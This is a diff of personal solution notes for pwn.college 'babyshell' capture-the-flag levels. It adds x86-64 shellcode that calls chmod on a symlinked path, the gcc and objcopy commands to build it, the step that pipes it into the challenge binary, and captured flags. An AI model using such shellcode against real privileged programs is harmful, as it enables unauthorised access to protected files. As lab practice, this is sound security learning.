@@ -538,7 +538,11 @@ pwn.college{A_y2Yv8-W_AN4clyzzCpt_2Cv-S.QX0IjMscTOxUzW}
 
 
 
-
+gcc -nostdlib -o solve.elf shellchmod9.s
+./solve.elf
+objdump -M intel -d solve.elf
+objcopy --dump-section .text=solve.bin solve.elf
+cat solve.bin | /challenge/babyshell_level*
 
 # 10
 # s file
@@ -554,7 +558,7 @@ _start:
 	pop rdi
 
    	mov sil, 7          # set perm to 4
-    	mov al, 90         # chmod syscall
+    mov al, 90         # chmod syscall
 	syscall
 
 gcc -nostdlib -o solve.elf shellchmod3.s
@@ -563,6 +567,27 @@ objdump -M intel -d solve.elf
 objcopy --dump-section .text=solve.bin solve.elf
 cat solve.bin | /challenge/babyshell_level*
 pwn.college{c5iFhV9y_gBxmt_B7rhrEF_fvUv.QX2IjMscTOxUzW}
+
+# 11
+# s file shellchmod3.s
+ # load path f to register
+    xor rcx, rcx
+	mov cl, 0x5A     # symlink to Z
+	push rcx
+	push rsp
+	pop rdi
+
+   	mov sil, 7          # set perm to 4
+    mov al, 90         # chmod syscall
+	syscall
+
+gcc -nostdlib -o solve.elf shellchmod3.s
+./solve.elf
+objdump -M intel -d solve.elf
+objcopy --dump-section .text=solve.bin solve.elf
+cat solve.bin | /challenge/babyshell_level*
+
+pwn.college{8iBRHMjHGTdon1EduVvtaKd2nYe.QX3IjMscTOxUzW}
 
 # 13
 mov al, 90
